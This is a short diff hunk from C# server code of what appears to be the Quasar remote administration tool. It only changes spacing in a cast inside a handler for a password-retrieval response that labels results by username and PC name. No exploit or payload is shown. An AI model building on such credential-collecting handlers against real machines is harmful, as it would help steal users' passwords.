@@ -86,7 +86,7 @@ namespace Quasar.Server.Messages
 
         private void Execute(ISender client, GetPasswordsResponse message)
         {
-            Client c = (Client) client;
+            Client c = (Client)client;
 
             string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";
 
